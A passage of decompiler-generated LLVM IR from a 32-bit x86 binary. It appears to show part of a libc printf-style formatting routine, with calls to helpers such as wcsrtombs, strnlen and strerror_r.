  %v0_8051f6a = phi i32 [ %v3_8051ef6, %dec_label_pc_8051f1d ], [ 1, %dec_label_pc_8051f21 ], [ %v3_8051ef6, %dec_label_pc_8051f18 ], [ %v3_8051ef6, %dec_label_pc_8051edf ], [ %v3_8051ef6, %dec_label_pc_8051f11 ], [ %v1_8051f2b, %dec_label_pc_8051f2b ]
  %v1_8051f31 = inttoptr i32 %v0_8051f31 to i8*
  %v2_8051f31 = load i8, i8* %v1_8051f31, align 1
  %v3_8051f31 = add i8 %v2_8051f31, -48
  %v8_8051f31 = icmp eq i8 %v3_8051f31, 0
  %v9_8051f31 = icmp slt i8 %v3_8051f31, 0
  store i1 %v9_8051f31, i1* %sf.global-to-local, align 1
  %v1_8051f34 = icmp eq i1 %v8_8051f31, false
  br i1 %v1_8051f34, label %dec_label_pc_8051f62, label %dec_label_pc_8051f36

dec_label_pc_8051f36:                             ; preds = %dec_label_pc_8051f31
  %v0_8051f36 = load i32, i32* @ebp, align 4
  %v1_8051f36 = add i32 %v0_8051f36, -6
  %v6_8051f36 = sub i32 5, %v0_8051f36
  %v7_8051f36 = and i32 %v6_8051f36, %v0_8051f36
  %v8_8051f36 = icmp slt i32 %v7_8051f36, 0
  %v10_8051f36 = icmp slt i32 %v1_8051f36, 0
  store i32 11, i32* %eax.global-to-local, align 4
  %v2_8051f3e = icmp eq i1 %v10_8051f36, %v8_8051f36
  %v5_8051f3e = select i1 %v2_8051f3e, i32 11, i32 %v0_8051f36
  store i32 %v5_8051f3e, i32* @ebp, align 4
  %v1_8051f41 = add i32 %v0_8051f41, 48
  %v2_8051f41 = inttoptr i32 %v1_8051f41 to i32*
  %v3_8051f41 = load i32, i32* %v2_8051f41, align 4
  %v4_8051f41 = add i32 %v3_8051f41, -1
  %v12_8051f41 = icmp eq i32 %v4_8051f41, 0
  %v13_8051f41 = icmp slt i32 %v4_8051f41, 0
  store i1 %v13_8051f41, i1* %sf.global-to-local, align 1
  %v1_8051f46 = icmp eq i1 %v12_8051f41, false
  br i1 %v1_8051f46, label %dec_label_pc_8051f57, label %dec_label_pc_8051f48

dec_label_pc_8051f48:                             ; preds = %dec_label_pc_8051f36
  store i32 5, i32* @esi, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_805a238.479 to i32), i32* @edi, align 4
  br label %dec_label_pc_80520e1

dec_label_pc_8051f57:                             ; preds = %dec_label_pc_8051f36
  %v1_8051f57 = icmp eq i32 %v0_8051f6a, 0
  %v2_8051f57 = icmp slt i32 %v0_8051f6a, 0
  store i1 %v2_8051f57, i1* %sf.global-to-local, align 1
  %v1_8051f59 = icmp eq i1 %v1_8051f57, false
  br i1 %v1_8051f59, label %dec_label_pc_8051f62, label %dec_label_pc_8051f5b

dec_label_pc_8051f5b:                             ; preds = %dec_label_pc_8051f57
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_80520e1

dec_label_pc_8051f62:                             ; preds = %dec_label_pc_8051f57, %dec_label_pc_8051f31
  %v2_8051f62 = sub i32 %v0_8051f6a, %v1_8051ef1
  %v7_8051f62 = icmp ult i32 %v0_8051f6a, %v1_8051ef1
  %v12_8051f62 = icmp eq i32 %v2_8051f62, 0
  %v13_8051f62 = icmp slt i32 %v2_8051f62, 0
  store i1 %v13_8051f62, i1* %sf.global-to-local, align 1
  %v2_8051f64 = or i1 %v7_8051f62, %v12_8051f62
  br i1 %v2_8051f64, label %dec_label_pc_80520e1, label %dec_label_pc_8051f6a

dec_label_pc_8051f6a:                             ; preds = %dec_label_pc_8051f62
  store i1 %v13_8051f62, i1* %sf.global-to-local, align 1
  store i32 %v2_8051f62, i32* @ebx, align 4
  br label %dec_label_pc_80520fb

dec_label_pc_8051f73:                             ; preds = %dec_label_pc_8051e06
  %v1_8051f73 = add i32 %v3_8051dd8, -15
  %v5_8051f73 = icmp ult i32 %v3_8051dd8, 15
  %v9_8051f73 = icmp eq i32 %v1_8051f73, 0
  %v10_8051f73 = icmp slt i32 %v1_8051f73, 0
  store i1 %v10_8051f73, i1* %sf.global-to-local, align 1
  %v2_8051f76 = or i1 %v5_8051f73, %v9_8051f73
  br i1 %v2_8051f76, label %dec_label_pc_8051f78, label %dec_label_pc_8051fbd

dec_label_pc_8051f78:                             ; preds = %dec_label_pc_8051f73
  %v1_8051f78 = add i32 %v0_8051dd8.lcssa, 33
  %v2_8051f78 = inttoptr i32 %v1_8051f78 to i8*
  %v3_8051f78 = load i8, i8* %v2_8051f78, align 1
  %v4_8051f78 = and i8 %v3_8051f78, 8
  %v5_8051f78 = icmp eq i8 %v4_8051f78, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_8051f7d = add i32 %v0_8051dd8.lcssa, 344
  %v2_8051f7d = inttoptr i32 %v1_8051f7d to i32*
  %v3_8051f7d = load i32, i32* %v2_8051f7d, align 4
  store i32 %v3_8051f7d, i32* %edx.global-to-local, align 4
  br i1 %v5_8051f78, label %dec_label_pc_8051f8a, label %dec_label_pc_8051f86

dec_label_pc_8051f86:                             ; preds = %dec_label_pc_8051f78
  %v1_8051f86 = inttoptr i32 %v3_8051f7d to x86_fp80*
  %v2_8051f86 = load x86_fp80, x86_fp80* %v1_8051f86, align 4
  br label %dec_label_pc_8051f8c

dec_label_pc_8051f8a:                             ; preds = %dec_label_pc_8051f78
  %v1_8051f8a = inttoptr i32 %v3_8051f7d to double*
  %v2_8051f8a = load double, double* %v1_8051f8a, align 4
  %v3_8051f8a = fpext double %v2_8051f8a to x86_fp80
  br label %dec_label_pc_8051f8c

dec_label_pc_8051f8c:                             ; preds = %dec_label_pc_8051f86, %dec_label_pc_8051f8a
  %storemerge4 = phi x86_fp80 [ %v2_8051f86, %dec_label_pc_8051f86 ], [ %v3_8051f8a, %dec_label_pc_8051f8a ]
  store x86_fp80 %storemerge4, x86_fp80* %st0.global-to-local, align 4
  %v0_8051f8c = load i32, i32* @esi, align 4
  %v2_8051f8c = add i32 %v0_8051dd8.lcssa, -4
  %v3_8051f8c = inttoptr i32 %v2_8051f8c to i32*
  store i32 %v0_8051f8c, i32* %v3_8051f8c, align 4
  %v0_8051f8d = load i32, i32* @esi, align 4
  %v2_8051f8d = add i32 %v0_8051dd8.lcssa, -8
  %v3_8051f8d = inttoptr i32 %v2_8051f8d to i32*
  store i32 %v0_8051f8d, i32* %v3_8051f8d, align 4
  %v1_8051f8e = add i32 %v0_8051dd8.lcssa, -12
  %v2_8051f8e = inttoptr i32 %v1_8051f8e to i32*
  store i32 134552654, i32* %v2_8051f8e, align 4
  %v1_8051f93 = add i32 %v0_8051dd8.lcssa, 20
  store i32 %v1_8051f93, i32* %eax.global-to-local, align 4
  %v2_8051f97 = add i32 %v0_8051dd8.lcssa, -16
  %v3_8051f97 = inttoptr i32 %v2_8051f97 to i32*
  store i32 %v1_8051f93, i32* %v3_8051f97, align 4
  %v1_8051f98 = add i32 %v0_8051dd8.lcssa, -28
  %v10_8051f98 = icmp slt i32 %v1_8051f98, 0
  store i1 %v10_8051f98, i1* %sf.global-to-local, align 1
  %v1_8051f9b = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_8051f9b = inttoptr i32 %v1_8051f98 to x86_fp80*
  store x86_fp80 %v1_8051f9b, x86_fp80* %v3_8051f9b, align 4
  %v1_8051f9e = add i32 %v0_8051dd8.lcssa, 368
  %v2_8051f9e = inttoptr i32 %v1_8051f9e to i32*
  %v3_8051f9e = load i32, i32* %v2_8051f9e, align 4
  %v5_8051f9e = add i32 %v0_8051dd8.lcssa, -32
  %v6_8051f9e = inttoptr i32 %v5_8051f9e to i32*
  store i32 %v3_8051f9e, i32* %v6_8051f9e, align 4
  %v0_8051fa5 = call i32 @_fpmaxtostr()
  store i32 %v0_8051fa5, i32* %eax.global-to-local, align 4
  %v0_8051faa = load i32, i32* @esp, align 4
  %v1_8051faa = add i32 %v0_8051faa, 32
  %v2_8051fad = icmp slt i32 %v0_8051fa5, 0
  store i1 %v2_8051fad, i1* %sf.global-to-local, align 1
  br i1 %v2_8051fad, label %dec_label_pc_805225b, label %dec_label_pc_8051fb5

dec_label_pc_8051fb5:                             ; preds = %dec_label_pc_8051f8c
  %v1_8051fb5 = inttoptr i32 %v1_8051faa to i32*
  %v2_8051fb5 = load i32, i32* %v1_8051fb5, align 4
  %v4_8051fb5 = add i32 %v2_8051fb5, %v0_8051fa5
  %v15_8051fb5 = icmp slt i32 %v4_8051fb5, 0
  store i1 %v15_8051fb5, i1* %sf.global-to-local, align 1
  store i32 %v4_8051fb5, i32* %v1_8051fb5, align 4
  %v0_8052248.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052248

dec_label_pc_8051fbd:                             ; preds = %dec_label_pc_8051f73
  %v1_8051fbd = add i32 %v3_8051dd8, -17
  %v5_8051fbd = icmp ult i32 %v3_8051dd8, 17
  %v9_8051fbd = icmp eq i32 %v1_8051fbd, 0
  %v10_8051fbd = icmp slt i32 %v1_8051fbd, 0
  store i1 %v10_8051fbd, i1* %sf.global-to-local, align 1
  %v2_8051fc0 = or i1 %v5_8051fbd, %v9_8051fbd
  br i1 %v2_8051fc0, label %dec_label_pc_8051fc6, label %dec_label_pc_805205a

dec_label_pc_8051fc6:                             ; preds = %dec_label_pc_8051fbd
  %v1_8051fc6 = add i32 %v0_8051dd8.lcssa, 332
  %v2_8051fc6 = inttoptr i32 %v1_8051fc6 to i32*
  store i32 0, i32* %v2_8051fc6, align 4
  %v0_8051fd1 = load i32, i32* @esp, align 4
  %v1_8051fd1 = add i32 %v0_8051fd1, 344
  %v2_8051fd1 = inttoptr i32 %v1_8051fd1 to i32*
  %v3_8051fd1 = load i32, i32* %v2_8051fd1, align 4
  store i32 %v3_8051fd1, i32* %edx.global-to-local, align 4
  %v1_8051fd8 = icmp eq i1 %v9_8051fbd, false
  br i1 %v1_8051fd8, label %dec_label_pc_805202a, label %dec_label_pc_8051fda

dec_label_pc_8051fda:                             ; preds = %dec_label_pc_8051fc6
  %v1_8051fda = inttoptr i32 %v3_8051fd1 to i32*
  %v2_8051fda = load i32, i32* %v1_8051fda, align 4
  store i32 %v2_8051fda, i32* %eax.global-to-local, align 4
  %v1_8051fdc = icmp eq i32 %v2_8051fda, 0
  %v2_8051fdc = icmp slt i32 %v2_8051fda, 0
  store i1 %v2_8051fdc, i1* %sf.global-to-local, align 1
  %v2_8051fde = add i32 %v0_8051fd1, 340
  %v3_8051fde = inttoptr i32 %v2_8051fde to i32*
  store i32 %v2_8051fda, i32* %v3_8051fde, align 4
  br i1 %v1_8051fdc, label %dec_label_pc_80520e5, label %dec_label_pc_8051feb

dec_label_pc_8051feb:                             ; preds = %dec_label_pc_8051fda
  %v0_8051feb = load i32, i32* @esp, align 4
  %v1_8051feb = add i32 %v0_8051feb, 20
  %v2_8051feb = inttoptr i32 %v1_8051feb to i32*
  %v3_8051feb = load i32, i32* %v2_8051feb, align 4
  %v1_8051ff2 = add i32 %v0_8051feb, 340
  store i32 %v1_8051ff2, i32* %ecx.global-to-local, align 4
  %v2_8051ff9 = icmp slt i32 %v3_8051feb, 0
  store i1 %v2_8051ff9, i1* %sf.global-to-local, align 1
  %v1_8051ffb = icmp eq i1 %v2_8051ff9, false
  %v4_8051ffb = select i1 %v1_8051ffb, i32 %v3_8051feb, i32 -1
  store i32 %v4_8051ffb, i32* %edx.global-to-local, align 4
  %v1_8051ffe = add i32 %v0_8051feb, 332
  store i32 %v1_8051ffe, i32* %eax.global-to-local, align 4
  %v2_8052005 = add i32 %v0_8051feb, -4
  %v3_8052005 = inttoptr i32 %v2_8052005 to i32*
  store i32 %v1_8051ffe, i32* %v3_8052005, align 4
  %v0_8052006 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052006 = add i32 %v0_8051feb, -8
  %v3_8052006 = inttoptr i32 %v2_8052006 to i32*
  store i32 %v0_8052006, i32* %v3_8052006, align 4
  %v0_8052007 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052007 = add i32 %v0_8051feb, -12
  %v3_8052007 = inttoptr i32 %v2_8052007 to i32*
  store i32 %v0_8052007, i32* %v3_8052007, align 4
  %v0_8052008 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052008 = add i32 %v0_8051feb, -16
  %v3_8052008 = inttoptr i32 %v2_8052008 to i32*
  store i32 %v0_8052008, i32* %v3_8052008, align 4
  %v0_8052009 = call i32 @__GI_wcsrtombs()
  store i32 %v0_8052009, i32* %eax.global-to-local, align 4
  %v0_805200e = load i32, i32* @esp, align 4
  %v1_805200e = add i32 %v0_805200e, 16
  %v1_8052011 = add i32 %v0_8052009, 1
  %v10_8052011 = icmp eq i32 %v1_8052011, 0
  %v11_8052011 = icmp slt i32 %v1_8052011, 0
  store i1 %v11_8052011, i1* %sf.global-to-local, align 1
  store i32 %v0_8052009, i32* @esi, align 4
  br i1 %v10_8052011, label %dec_label_pc_805225b, label %dec_label_pc_805201c

dec_label_pc_805201c:                             ; preds = %dec_label_pc_8051feb
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_80520f6

dec_label_pc_805202a:                             ; preds = %dec_label_pc_8051fc6
  %v0_805202a = load i32, i32* @ebx, align 4
  %v2_805202a = add i32 %v0_8051fd1, -4
  %v3_805202a = inttoptr i32 %v2_805202a to i32*
  store i32 %v0_805202a, i32* %v3_805202a, align 4
  %v1_805202b = add i32 %v0_8051fd1, 332
  store i32 %v1_805202b, i32* %eax.global-to-local, align 4
  %v2_8052032 = add i32 %v0_8051fd1, -8
  %v3_8052032 = inttoptr i32 %v2_8052032 to i32*
  store i32 %v1_805202b, i32* %v3_8052032, align 4
  %v0_8052033 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052033 = inttoptr i32 %v0_8052033 to i32*
  %v2_8052033 = load i32, i32* %v1_8052033, align 4
  %v4_8052033 = add i32 %v0_8051fd1, -12
  %v5_8052033 = inttoptr i32 %v4_8052033 to i32*
  store i32 %v2_8052033, i32* %v5_8052033, align 4
  %v1_8052035 = add i32 %v0_8051fd1, 204
  store i32 %v1_8052035, i32* @edi, align 4
  %v2_805203c = add i32 %v0_8051fd1, -16
  %v3_805203c = inttoptr i32 %v2_805203c to i32*
  store i32 %v1_8052035, i32* %v3_805203c, align 4
  %v0_805203d = call i32 @__GI_wcrtomb()
  store i32 %v0_805203d, i32* %eax.global-to-local, align 4
  %v0_8052042 = load i32, i32* @esp, align 4
  %v1_8052042 = add i32 %v0_8052042, 16
  %v1_8052045 = add i32 %v0_805203d, 1
  %v10_8052045 = icmp eq i32 %v1_8052045, 0
  %v11_8052045 = icmp slt i32 %v1_8052045, 0
  store i1 %v11_8052045, i1* %sf.global-to-local, align 1
  store i32 %v0_805203d, i32* @esi, align 4
  br i1 %v10_8052045, label %dec_label_pc_805225b, label %dec_label_pc_8052050

dec_label_pc_8052050:                             ; preds = %dec_label_pc_805202a
  %v2_8052050 = add i32 %v0_805203d, 220
  %v3_8052050 = add i32 %v2_8052050, %v0_8052042
  %v4_8052050 = inttoptr i32 %v3_8052050 to i8*
  store i8 0, i8* %v4_8052050, align 1
  br label %dec_label_pc_8052088

dec_label_pc_805205a:                             ; preds = %dec_label_pc_8051fbd
  %v1_805205a = add i32 %v3_8051dd8, -19
  %v5_805205a = icmp ult i32 %v3_8051dd8, 19
  %v9_805205a = icmp eq i32 %v1_805205a, 0
  %v10_805205a = icmp slt i32 %v1_805205a, 0
  store i1 %v10_805205a, i1* %sf.global-to-local, align 1
  %v2_805205d = or i1 %v5_805205a, %v9_805205a
  br i1 %v2_805205d, label %dec_label_pc_805205f, label %dec_label_pc_80520b7

dec_label_pc_805205f:                             ; preds = %dec_label_pc_805205a
  %v1_805205f = add i32 %v0_8051dd8.lcssa, 344
  %v2_805205f = inttoptr i32 %v1_805205f to i32*
  %v3_805205f = load i32, i32* %v2_805205f, align 4
  store i32 %v3_805205f, i32* %edx.global-to-local, align 4
  %v1_8052066 = icmp eq i1 %v9_805205a, false
  %v1_8052091 = inttoptr i32 %v3_805205f to i32*
  %v2_8052091 = load i32, i32* %v1_8052091, align 4
  br i1 %v1_8052066, label %dec_label_pc_8052091, label %dec_label_pc_8052068

dec_label_pc_8052068:                             ; preds = %dec_label_pc_805205f
  store i32 %v2_8052091, i32* @edi, align 4
  %v1_805206a = icmp eq i32 %v2_8052091, 0
  %v2_805206a = icmp slt i32 %v2_8052091, 0
  store i1 %v2_805206a, i1* %sf.global-to-local, align 1
  br i1 %v1_805206a, label %dec_label_pc_80520e5, label %dec_label_pc_805206e

dec_label_pc_805206e:                             ; preds = %dec_label_pc_8052068, %dec_label_pc_80520c0
  %v1_8052075 = phi i32 [ %v0_8051dd8.lcssa, %dec_label_pc_8052068 ], [ %v1_80520da, %dec_label_pc_80520c0 ]
  %v1_805206e = add i32 %v1_8052075, 20
  %v2_805206e = inttoptr i32 %v1_805206e to i32*
  %v3_805206e = load i32, i32* %v2_805206e, align 4
  store i32 %v3_805206e, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v2_8052075 = add i32 %v1_8052075, -4
  %v3_8052075 = inttoptr i32 %v2_8052075 to i32*
  store i32 %v3_8051dd8, i32* %v3_8052075, align 4
  %v2_8052076 = add i32 %v1_8052075, -8
  %v3_8052076 = inttoptr i32 %v2_8052076 to i32*
  store i32 %v3_8051dd8, i32* %v3_8052076, align 4
  %v2_8052077 = icmp slt i32 %v3_805206e, 0
  store i1 %v2_8052077, i1* %sf.global-to-local, align 1
  %v1_8052079 = icmp eq i1 %v2_8052077, false
  %v2_8052079 = load i32, i32* %eax.global-to-local, align 4
  %v4_8052079 = select i1 %v1_8052079, i32 %v3_805206e, i32 %v2_8052079
  store i32 %v4_8052079, i32* %eax.global-to-local, align 4
  %v2_805207c = add i32 %v1_8052075, -12
  %v3_805207c = inttoptr i32 %v2_805207c to i32*
  store i32 %v4_8052079, i32* %v3_805207c, align 4
  %v0_805207d = load i32, i32* @edi, align 4
  %v2_805207d = add i32 %v1_8052075, -16
  %v3_805207d = inttoptr i32 %v2_805207d to i32*
  store i32 %v0_805207d, i32* %v3_805207d, align 4
  %v0_805207e = call i32 @strnlen()
  store i32 %v0_805207e, i32* %eax.global-to-local, align 4
  %v0_8052083 = load i32, i32* @esp, align 4
  %v1_8052083 = add i32 %v0_8052083, 16
  %v7_8052083 = icmp slt i32 %v1_8052083, 0
  store i1 %v7_8052083, i1* %sf.global-to-local, align 1
  store i32 %v0_805207e, i32* @esi, align 4
  br label %dec_label_pc_8052088

dec_label_pc_8052088:                             ; preds = %dec_label_pc_8052050, %dec_label_pc_805206e
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_80520f6

dec_label_pc_8052091:                             ; preds = %dec_label_pc_805205f
  store i32 %v2_8052091, i32* %eax.global-to-local, align 4
  store i32 1, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v1_805209f = add i32 %v0_8051dd8.lcssa, 204
  store i32 %v1_805209f, i32* @edi, align 4
  %v1_80520a6 = add i32 %v0_8051dd8.lcssa, 205
  %v2_80520a6 = inttoptr i32 %v1_80520a6 to i8*
  store i8 0, i8* %v2_80520a6, align 1
  %v0_80520ae = load i32, i32* %eax.global-to-local, align 4
  %v1_80520ae = trunc i32 %v0_80520ae to i8
  %v2_80520ae = load i32, i32* @esp, align 4
  %v3_80520ae = add i32 %v2_80520ae, 204
  %v4_80520ae = inttoptr i32 %v3_80520ae to i8*
  store i8 %v1_80520ae, i8* %v4_80520ae, align 1
  br label %dec_label_pc_80520f6

dec_label_pc_80520b7:                             ; preds = %dec_label_pc_805205a
  %v1_80520b7 = add i32 %v3_8051dd8, -20
  %v9_80520b7 = icmp eq i32 %v1_80520b7, 0
  %v10_80520b7 = icmp slt i32 %v1_80520b7, 0
  store i1 %v10_80520b7, i1* %sf.global-to-local, align 1
  %v1_80520ba = icmp eq i1 %v9_80520b7, false
  br i1 %v1_80520ba, label %dec_label_pc_805225b, label %dec_label_pc_80520c0

dec_label_pc_80520c0:                             ; preds = %dec_label_pc_80520b7
  %v0_80520c0 = load i32, i32* %stack_var_-364, align 4
  %v1_80520c0 = call i32 @__errno_location(i32 %v0_80520c0)
  store i32 %v1_80520c0, i32* %eax.global-to-local, align 4
  %v0_80520c5 = load i32, i32* %edx.global-to-local, align 4
  %v1_80520c5 = load i32, i32* @esp, align 4
  %v2_80520c5 = add i32 %v1_80520c5, -4
  %v3_80520c5 = inttoptr i32 %v2_80520c5 to i32*
  store i32 %v0_80520c5, i32* %v3_80520c5, align 4
  %v1_80520c6 = add i32 %v1_80520c5, -8
  %v2_80520c6 = inttoptr i32 %v1_80520c6 to i32*
  store i32 128, i32* %v2_80520c6, align 4
  %v1_80520cb = add i32 %v1_80520c5, 204
  store i32 %v1_80520cb, i32* %edx.global-to-local, align 4
  %v2_80520d2 = add i32 %v1_80520c5, -12
  %v3_80520d2 = inttoptr i32 %v2_80520d2 to i32*
  store i32 %v1_80520cb, i32* %v3_80520d2, align 4
  %v1_80520d3 = inttoptr i32 %v1_80520c0 to i32*
  %v2_80520d3 = load i32, i32* %v1_80520d3, align 4
  %v4_80520d3 = add i32 %v1_80520c5, -16
  %v5_80520d3 = inttoptr i32 %v4_80520d3 to i32*
  store i32 %v2_80520d3, i32* %v5_80520d3, align 4
  %v0_80520d5 = call i32 @__GI___glibc_strerror_r()
  store i32 %v0_80520d5, i32* %eax.global-to-local, align 4
  %v0_80520da = load i32, i32* @esp, align 4
  %v1_80520da = add i32 %v0_80520da, 16
  %v7_80520da = icmp slt i32 %v1_80520da, 0
  store i1 %v7_80520da, i1* %sf.global-to-local, align 1
  store i32 %v0_80520d5, i32* @edi, align 4
  br label %dec_label_pc_805206e

dec_label_pc_80520e1:                             ; preds = %dec_label_pc_8051f62, %dec_label_pc_8051f5b, %dec_label_pc_8051f48
  %v0_80520fe34 = phi i32 [ %v1_8051ef1, %dec_label_pc_8051f62 ], [ 0, %dec_label_pc_8051f5b ], [ 5, %dec_label_pc_8051f48 ]
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_80520fb

dec_label_pc_80520e5:                             ; preds = %dec_label_pc_8052068, %dec_label_pc_8051fda
  store i32 6, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805a23e.480 to i32), i32* @edi, align 4
  br label %dec_label_pc_80520f6

dec_label_pc_80520f6:                             ; preds = %dec_label_pc_8052091, %dec_label_pc_8052088, %dec_label_pc_805201c, %dec_label_pc_80520e5
  %v0_80520f6 = load i32, i32* @esp, align 4
  %v1_80520f6 = add i32 %v0_80520f6, 7
  %v2_80520f6 = inttoptr i32 %v1_80520f6 to i8*
  store i8 32, i8* %v2_80520f6, align 1
  %v0_80520fe.pre = load i32, i32* @esi, align 4
  %v1_80520fe.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80520fb

dec_label_pc_80520fb:                             ; preds = %dec_label_pc_80520e1, %dec_label_pc_8051f6a, %dec_label_pc_80520f6
  %v1_80520fe = phi i32 [ 0, %dec_label_pc_80520e1 ], [ %v2_8051f62, %dec_label_pc_8051f6a ], [ %v1_80520fe.pre, %dec_label_pc_80520f6 ]
  %v0_80520fe = phi i32 [ %v0_80520fe34, %dec_label_pc_80520e1 ], [ %v1_8051ef1, %dec_label_pc_8051f6a ], [ %v0_80520fe.pre, %dec_label_pc_80520f6 ]
  %v0_80520fb = load i32, i32* @ebp, align 4
  %v1_80520fb = add i32 %v0_80520fb, -11
  %v9_80520fb = icmp eq i32 %v1_80520fb, 0
  %v10_80520fb = icmp slt i32 %v1_80520fb, 0
  store i1 %v10_80520fb, i1* %sf.global-to-local, align 1
  %v2_80520fe = add i32 %v0_80520fe, %v1_80520fe
  store i32 %v2_80520fe, i32* @edx, align 4
  br i1 %v9_80520fb, label %dec_label_pc_805210f, label %dec_label_pc_8052103

dec_label_pc_8052103:                             ; preds = %dec_label_pc_80520fb
  %v1_8052105 = add i32 %v0_80520fb, -5
  %v6_8052105 = sub i32 4, %v0_80520fb
  %v7_8052105 = and i32 %v6_8052105, %v0_80520fb
  %v8_8052105 = icmp slt i32 %v7_8052105, 0
  %v9_8052105 = icmp eq i32 %v1_8052105, 0
  %v10_8052105 = icmp slt i32 %v1_8052105, 0
  store i1 %v10_8052105, i1* %sf.global-to-local, align 1
  %v3_8052108 = icmp eq i1 %v10_8052105, %v8_8052105
  %v4_8052108 = icmp eq i1 %v9_8052105, false
  %v5_8052108 = and i1 %v4_8052108, %v3_8052108
  %v6_8052108 = zext i1 %v5_8052108 to i32
  store i32 %v6_8052108, i32* %eax.global-to-local, align 4
  %v2_805210b = add i32 %v2_80520fe, 1
  %v3_805210b = add i32 %v2_805210b, %v6_8052108
  store i32 %v3_805210b, i32* @edx, align 4
  br label %dec_label_pc_805210f

dec_label_pc_805210f:                             ; preds = %dec_label_pc_80520fb, %dec_label_pc_8052103
  %v0_805210f = load i32, i32* @esp, align 4
  %v1_805210f = add i32 %v0_805210f, 24
  %v2_805210f = inttoptr i32 %v1_805210f to i32*
  %v3_805210f = load i32, i32* %v2_805210f, align 4
  store i32 %v3_805210f, i32* %eax.global-to-local, align 4
  %v1_8052113 = add i32 %v0_805210f, 8
  %v2_8052113 = inttoptr i32 %v1_8052113 to i32*
  store i32 0, i32* %v2_8052113, align 4
  %v0_805211b = load i32, i32* %eax.global-to-local, align 4
  %v1_805211b = load i32, i32* @edx, align 4
  %v2_805211b = sub i32 %v0_805211b, %v1_805211b
  %v7_805211b = icmp ult i32 %v0_805211b, %v1_805211b
  %v12_805211b = icmp eq i32 %v2_805211b, 0
  %v13_805211b = icmp slt i32 %v2_805211b, 0
  store i1 %v13_805211b, i1* %sf.global-to-local, align 1
  %v2_805211d = or i1 %v7_805211b, %v12_805211b
  br i1 %v2_805211d, label %dec_label_pc_8052125, label %dec_label_pc_805211f

dec_label_pc_805211f:                             ; preds = %dec_label_pc_805210f
  store i1 %v13_805211b, i1* %sf.global-to-local, align 1
  store i32 %v2_805211b, i32* %eax.global-to-local, align 4
  %v1_8052121 = load i32, i32* @esp, align 4
  %v2_8052121 = add i32 %v1_8052121, 8
  %v3_8052121 = inttoptr i32 %v2_8052121 to i32*
  store i32 %v2_805211b, i32* %v3_8052121, align 4
  %v0_8052129.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052125

dec_label_pc_8052125:                             ; preds = %dec_label_pc_805210f, %dec_label_pc_805211f
  %v0_8052129 = phi i32 [ %v1_805211b, %dec_label_pc_805210f ], [ %v0_8052129.pre, %dec_label_pc_805211f ]
  %v0_8052125 = load i32, i32* @esp, align 4
  %v1_8052125 = add i32 %v0_8052125, 8
  %v2_8052125 = inttoptr i32 %v1_8052125 to i32*
  %v3_8052125 = load i32, i32* %v2_8052125, align 4
  store i32 %v3_8052125, i32* @ecx, align 4
  %v2_8052129 = add i32 %v3_8052125, %v0_8052129
  store i32 %v2_8052129, i32* %eax.global-to-local, align 4
  %v1_805212c = inttoptr i32 %v0_8052125 to i32*
  %v2_805212c = load i32, i32* %v1_805212c, align 4
  %v4_805212c = add i32 %v2_805212c, %v2_8052129
  %v15_805212c = icmp slt i32 %v4_805212c, 0
  store i1 %v15_805212c, i1* %sf.global-to-local, align 1
  store i32 %v4_805212c, i32* %v1_805212c, align 4
  %v0_805212f = load i32, i32* @esp, align 4
  %v1_805212f = add i32 %v0_805212f, 7
  %v2_805212f = inttoptr i32 %v1_805212f to i8*
  %v3_805212f = load i8, i8* %v2_805212f, align 1
  %v4_805212f = add i8 %v3_805212f, -48
  %v9_805212f = icmp eq i8 %v4_805212f, 0
  %v10_805212f = icmp slt i8 %v4_805212f, 0
  store i1 %v10_805212f, i1* %sf.global-to-local, align 1
  %v1_8052134 = icmp eq i1 %v9_805212f, false
  br i1 %v1_8052134, label %dec_label_pc_8052140, label %dec_label_pc_8052136

dec_label_pc_8052136:                             ; preds = %dec_label_pc_8052125
  %v0_8052136 = load i32, i32* @ebx, align 4
  %v1_8052136 = load i32, i32* @ecx, align 4
  %v2_8052136 = add i32 %v1_8052136, %v0_8052136
  %v13_8052136 = icmp slt i32 %v2_8052136, 0
  store i1 %v13_8052136, i1* %sf.global-to-local, align 1
  store i32 %v2_8052136, i32* @ebx, align 4
  %v1_8052138 = add i32 %v0_805212f, 8
  %v2_8052138 = inttoptr i32 %v1_8052138 to i32*
  store i32 0, i32* %v2_8052138, align 4
  %v0_8052140.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052140

dec_label_pc_8052140:                             ; preds = %dec_label_pc_8052125, %dec_label_pc_8052136
  %v0_8052147 = phi i32 [ %v0_805212f, %dec_label_pc_8052125 ], [ %v0_8052140.pre, %dec_label_pc_8052136 ]
  %v1_8052140 = add i32 %v0_8052147, 32
  %v2_8052140 = inttoptr i32 %v1_8052140 to i8*
  %v3_8052140 = load i8, i8* %v2_8052140, align 1
  %v4_8052140 = and i8 %v3_8052140, 8
  %v5_8052140 = icmp eq i8 %v4_8052140, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_8052145 = icmp eq i1 %v5_8052140, false
  br i1 %v1_8052145, label %dec_label_pc_805216e, label %dec_label_pc_8052147

dec_label_pc_8052147:                             ; preds = %dec_label_pc_8052140
  %v1_8052147 = add i32 %v0_8052147, 8
